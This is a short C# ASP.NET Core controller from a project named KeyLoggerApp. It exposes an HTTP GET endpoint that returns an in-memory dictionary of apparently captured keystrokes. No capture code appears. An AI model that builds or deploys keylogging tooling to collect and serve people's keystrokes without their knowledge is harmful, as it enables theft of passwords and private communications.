using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace KeyLoggerApp.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class KeyLogController : ControllerBase
    {
        private readonly ILogger<KeyLogController> _logger;

        public KeyLogController(ILogger<KeyLogController> logger)
        {
            _logger = logger;
        }

        [HttpGet]
        public ActionResult Get()
        {
            return Ok(Program.keyLogDict.ToArray());
        }
    }
}
